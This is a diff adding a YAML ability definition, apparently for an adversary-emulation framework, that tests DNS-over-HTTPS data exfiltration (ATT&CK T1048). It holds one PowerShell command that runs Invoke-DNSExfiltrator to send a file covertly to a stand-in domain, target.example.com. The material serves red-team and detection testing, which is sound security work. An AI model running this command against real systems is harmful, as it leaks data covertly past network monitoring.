@@ -1,0 +1,21 @@
+- description: "DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS\
+    \ request covert channel. This is basically a data leak testing tool allowing\
+    \ to exfiltrate data over a covert channel.\n!!! Test will fail without a domain\
+    \ under your control with A record and NS record !!! \nSee this github page for\
+    \ more details - https://github.com/Arno0x/DNSExfiltrator\n"
+  id: 976ba17d4fcab66c2a917b81f54ab654
+  name: DNSExfiltration (doh)
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: Import-Module $env:Temp\dnsexfil.ps1; Invoke-DNSExfiltrator -i $env:Temp\dnsexfil.ps1
+          -d target.example.com -p atomic -doh google -t 500 None
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
